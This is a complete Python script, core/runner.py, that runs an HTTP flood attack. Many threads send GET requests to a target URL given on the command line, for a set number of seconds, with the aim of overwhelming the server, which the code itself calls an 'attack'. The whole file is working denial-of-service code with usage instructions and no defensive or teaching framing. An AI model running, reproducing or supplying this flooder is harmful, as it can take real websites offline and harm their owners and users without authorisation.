# core/runner.py
import sys
import time
import threading
import requests

def attack(target_url, duration, threads):
    print(f"Starting attack on {target_url} for {duration} seconds with {threads} threads...")

    def send_request():
        while time.time() < end_time:
            try:
                response = requests.get(target_url)
                print(f"Request sent! Status: {response.status_code}")
            except Exception as e:
                print(f"Request failed: {e}")

    end_time = time.time() + int(duration)
    thread_list = []

    for _ in range(int(threads)):
        t = threading.Thread(target=send_request)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("Attack finished.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 runner.py <target_url> <duration_seconds> <threads>")
        sys.exit(1)

    target_url = sys.argv[1]
    duration = sys.argv[2]
    threads = sys.argv[3]

    attack(target_url, duration, threads)
